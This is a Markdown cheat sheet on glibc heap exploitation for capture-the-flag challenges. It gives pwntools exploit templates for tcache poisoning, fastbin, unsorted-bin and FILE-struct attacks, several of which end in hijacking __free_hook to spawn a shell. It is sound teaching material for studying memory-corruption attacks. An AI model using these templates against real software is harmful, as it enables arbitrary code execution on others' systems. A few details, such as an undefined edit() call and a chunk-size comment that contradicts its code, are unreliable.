# Heap Exploitation (Heap Pwn)

## glibc Version Differences (Must Read)

All heap exploitation techniques are strongly bound to the glibc version. Confirm the version first:

```bash
./libc.so.6 | head -1
# GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.

# or strings
strings ./libc.so.6 | grep "GNU C Library"
```

| glibc Version | Key Change | Impact |
|-----------|---------|------|
| 2.26 and earlier | No tcache | unsorted/fastbin are the main battlefield |
| 2.27 | **tcache introduced** | tcache poisoning becomes trivial |
| 2.29 | unsorted bin unlink hardened (chunk size check) | unsorted bin attack is dead |
| 2.31 | tcache multiple checks (key field) | tcache poisoning gets slightly harder |
| 2.32 | **safe-linking** (fd pointer XORed with PROTECT_PTR) | must leak the heap base first |
| 2.34 | **__free_hook / __malloc_hook removed** | switch to FILE struct / exit handlers |
| 2.35+ | further hardening | same as 2.34; the FILE path still works |

## tcache poisoning (2.27 - 2.31)

### How It Works

tcache is a per-thread cache: one linked list per size class, singly linked (fd only).
Before 2.29, the double-free check only compared against the list head, without walking the list.

### Exploit Template (2.27 - 2.31)

```python
from pwn import *

p = process('./vuln')
libc = ELF('./libc.so.6')

def add(idx, size, data=b'a'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline().strip()

# === Step 1: leak libc base ===
# Allocate a chunk beyond the tcache range (>0x408), free it into the unsorted bin, leaving a stale main_arena pointer
for i in range(8):
    add(i, 0x80)
add(8, 0x80)  # prevent consolidation
for i in range(7):
    free(i)
free(7)       # the 8th one enters the unsorted bin, fd/bk point to main_arena+96
add(9, 0x80)  # split off part of it, preserving the fd
leak = u64(show(9).ljust(8, b'\x00'))
libc.address = leak - 0x3ebca0  # main_arena+96 offset, glibc 2.27 amd64
log.success(f'libc = {hex(libc.address)}')

# === Step 2: tcache poisoning → write __free_hook ===
add(10, 0x30)
add(11, 0x30)
free(10)
free(11)
# Use UAF to point chunk11's fd at __free_hook
edit(11, p64(libc.sym['__free_hook']))
add(12, 0x30)  # takes out chunk11
add(13, 0x30, p64(libc.sym['system']))  # what comes back is the __free_hook address; write system there

# Trigger: free a chunk whose contents are "/bin/sh\x00"
add(14, 0x30, b'/bin/sh\x00')
free(14)

p.interactive()
```

## safe-linking Bypass (2.32+)

```text
How it works: the fd written into tcache/fastbin is XORed by PROTECT_PTR:
    PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr

Bypass:
1. You must first leak a heap address (heap base)
2. Compute the obfuscated value: fake_fd_obf = (chunk_addr >> 12) ^ target
3. Write it in
```

```python
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

# leak heap base (unsorted bin residue / tcache fd residue)
heap_base = leaked_heap & ~0xfff

# poisoning
fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
edit(chunk_id, p64(fake_fd))
```

## fastbin attack (classic, mainly 2.26 and earlier)

```text
Key points:
1. fastbin is singly linked (fd only); no size check other than that the chunk size must match
2. After 2.27 tcache takes priority; fastbin is only used once tcache is full
3. You still need to forge memory that looks like a chunk (size field = the real chunk size, ± some slack)
```

```python
# double free
add(0, 0x60)
add(1, 0x60)
free(0)
free(1)
free(0)  # fastbin: 0 → 1 → 0

# Overwrite the fd with a fake chunk (the size bytes at fake_addr + 8 must match 0x70)
add(2, 0x60, p64(fake_addr))
add(3, 0x60)
add(4, 0x60)  # takes out the chunk at fake_addr
```

## unsorted bin attack (2.28 and earlier only)

```text
How it works: write main_arena+88 to an arbitrary address
Since 2.29 a bck->fd == victim check was added and it cannot be bypassed
Use: overwrite global_max_fast so small chunks also take the fastbin path → combine with a fastbin attack
```

```python
# Allocate an unsorted-bin-sized chunk
add(0, 0x100)
add(1, 0x100)  # prevent top consolidation
free(0)
# UAF: overwrite the bk pointer with target - 0x10
edit(0, p64(0) + p64(target - 0x10))
add(2, 0x100)  # taken out of unsorted → unlink → main_arena+88 written to target
```

## large bin attack

```text
How it works: a large bin has one extra layer over unsorted: fd_nextsize / bk_nextsize
Since 2.32 a chunk size check was added here too, but it still works for overwriting global_max_fast, _IO_list_all, etc.
An advanced technique, often used in combinations such as House of Husk
```

## House of XXX Cheat Sheet

| Name | Applicable Versions | Core Idea |
|------|---------|---------|
| House of Force | 2.28 and earlier | Set the top chunk size to a huge value → malloc anywhere |
| House of Lore | All versions | Forge a small bin chain → return an arbitrary address |
| House of Orange | 2.23-2.30 | unsorted attack to overwrite _IO_list_all, triggering _IO_flush_all_lockp |
| House of Roman | 2.23-2.26 | 12-bit brute force + fastbin attack to __malloc_hook |
| House of Einherjar | All versions | Forge prev_size + PREV_INUSE=0 → backward consolidation |
| House of Botcake | 2.27+ | tcache + unsorted bin combo that bypasses the tcache double-free check |
| House of Husk | 2.27+ | Overwrite printf's hook table (__printf_function_table) |
| House of Cat | 2.34+ | _IO_wfile_seekoff vtable exploitation, for hook-less versions |
| House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |

## Real Exploit Workflow (Generic 4 Steps)

```text
Step 1: leak heap base
  - Allocate a chunk → free it into tcache (2.32+ keeps the obfuscated fd) → show → back out the heap base
  - Or: allocate a large chunk → free into unsorted → split it back → show the fd

Step 2: leak libc base
  - Free a large chunk into the unsorted bin; fd/bk retain main_arena addresses
  - show → leak → libc.address = leak - main_arena_offset

Step 3: control IP
  - 2.27-2.33: tcache/fastbin poisoning → write __free_hook or __malloc_hook
  - 2.34+: FILE struct attack (_IO_2_1_stdout_ / stderr), overwrite the vtable → _IO_wfile_jumps
  - Or: hijack exit handlers (__exit_funcs / tls_dtor_list)

Step 4: getshell
  - free_hook = system, free("/bin/sh") → shell
  - 2.34+: setcontext + 53 gadget → rop chain in heap → execve
```

## Alternative Paths After the Hooks Were Removed in libc 2.34+

### FILE struct attack (_IO_2_1_stdout_ / _IO_2_1_stderr_)

```text
Goal: when the program calls puts/printf, execution eventually reaches _IO_file_xsputn → _IO_OVERFLOW → the vtable call
Hijack:
  1. Overwrite the vtable pointer of _IO_2_1_stderr_ to point at a forged vtable
  2. Forge the vtable so its __overflow field points to system or setcontext
  3. Make the first 8 bytes of fp (FILE*) itself "/bin/sh\x00" (serving as system's rdi)
Trigger: any puts/printf/abort/exit flushes stderr
```

### Exit handlers (`__exit_funcs` / `tls_dtor_list`)

```text
How it works: __run_exit_handlers walks the __exit_funcs linked list, calling each dtor
Hijack: point the list node's func pointer at system and arg at "/bin/sh"
Note: 2.34+ added PTR_DEMANGLE, so you must leak the fs:[0x30] guard value from tls to forge it
```

### tls_dtor_list (more modern)

```text
Walked by __call_tls_dtors; the structure is similar, and PTR_DEMANGLE must be bypassed the same way
Applies: runs at program exit; more general than the FILE attack
```

## pwndbg / GEF Heap Debugging Commands

```text
# pwndbg
heap              # show all chunks in the current arena
bins              # show tcache / fastbin / unsorted / small / large bins
tcache            # inspect tcache alone
find_fake_fast <addr> <size>  # find an fd write point usable as a fake chunk
vis_heap_chunks   # visualize the heap layout

# GEF
heap chunks
heap bins fast
heap bins tcache
heap chunk <addr>
```

## Typical pwntools Template (heap menu challenge)

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process('./vuln') if not args.REMOTE else remote('host', 1337)

# IO wrappers
def menu(choice):
    p.sendlineafter(b'choice:', str(choice).encode())

def add(idx, size, data=b'\n'):
    menu(1)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data != b'\n':
        p.sendafter(b'data:', data)

def free(idx):
    menu(2)
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    menu(3)
    p.sendlineafter(b'idx:', str(idx).encode())
    return p.recvline().strip()

def edit(idx, data):
    menu(4)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

# === Then pick the technique stack based on the vulnerability type ===
```

## Caveats

- **The glibc version is the first-order question** — the same binary with a 2.27 libc vs a 2.34 libc takes completely different exploit paths
- **tcache capacity = 7** (per size class) — you must spray 7 chunks before it spills over into unsorted/fastbin
- **chunk size = user request + 0x10 header, aligned to 0x10** (excluding the 0x10 header, up to 0x8 more bytes are actually writable because the next chunk's prev_size is reused)
- **Remote heap spraying is unreliable** — under a server fork model, brk/mmap may differ per connection; run randomization tests
- **Do not leave unsorted residue behind in the attack chain** — a main_arena pointer in an unexpected chunk garbles later show output
- **safe-linking error rate** — when computing PROTECT_PTR, remember it is `pos >> 12`, where pos is the address being written to, not the target address
